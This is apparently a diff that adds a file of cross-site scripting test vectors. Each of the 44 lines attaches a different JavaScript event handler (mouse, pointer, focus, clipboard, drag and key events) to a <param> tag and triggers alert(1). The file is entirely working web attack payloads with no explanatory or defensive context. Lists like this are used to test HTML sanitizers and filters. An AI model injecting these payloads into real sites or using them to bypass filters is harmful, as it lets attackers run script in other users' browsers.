@@ -1,0 +1,44 @@
+<param draggable="true" ondrag="alert(1)">test</param>
+<param draggable="true" ondragend="alert(1)">test</param>
+<param draggable="true" ondragenter="alert(1)">test</param>
+<param draggable="true" ondragleave="alert(1)">test</param>
+<param draggable="true" ondragstart="alert(1)">test</param>
+<param id=x tabindex=1 onactivate=alert(1)></param>
+<param id=x tabindex=1 onbeforeactivate=alert(1)></param>
+<param id=x tabindex=1 onbeforedeactivate=alert(1)></param><input autofocus>
+<param id=x tabindex=1 ondeactivate=alert(1)></param><input id=y autofocus>
+<param id=x tabindex=1 onfocus=alert(1)></param>
+<param id=x tabindex=1 onfocusin=alert(1)></param>
+<param onafterscriptexecute=alert(1)><script>1</script>
+<param onbeforecopy="alert(1)" contenteditable>test</param>
+<param onbeforecut="alert(1)" contenteditable>test</param>
+<param onbeforepaste="alert(1)" contenteditable>test</param>
+<param onbeforescriptexecute=alert(1)><script>1</script>
+<param onblur=alert(1) tabindex=1 id=x></param><input autofocus>
+<param onclick="alert(1)">test</param>
+<param oncontextmenu="alert(1)">test</param>
+<param oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<param oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<param ondblclick="alert(1)" autofocus tabindex=1>test</param>
+<param onfocusout=alert(1) tabindex=1 id=x></param><input autofocus>
+<param onkeydown="alert(1)" contenteditable>test</param>
+<param onkeypress="alert(1)" contenteditable>test</param>
+<param onkeyup="alert(1)" contenteditable>test</param>
+<param onmousedown="alert(1)">test</param>
+<param onmouseenter="alert(1)">test</param>
+<param onmouseleave="alert(1)">test</param>
+<param onmousemove="alert(1)">test</param>
+<param onmouseout="alert(1)">test</param>
+<param onmouseover="alert(1)">test</param>
+<param onmouseup="alert(1)">test</param>
+<param onmousewheel=alert(1)>requires scrolling
+<param onpaste="alert(1)" contenteditable>test</param>
+<param onpointerdown=alert(1)>XSS</param>
+<param onpointerenter=alert(1)>XSS</param>
+<param onpointerleave=alert(1)>XSS</param>
+<param onpointermove=alert(1)>XSS</param>
+<param onpointerout=alert(1)>XSS</param>
+<param onpointerover=alert(1)>XSS</param>
+<param onpointerrawupdate=alert(1)>XSS</param>
+<param onpointerup=alert(1)>XSS</param>
+
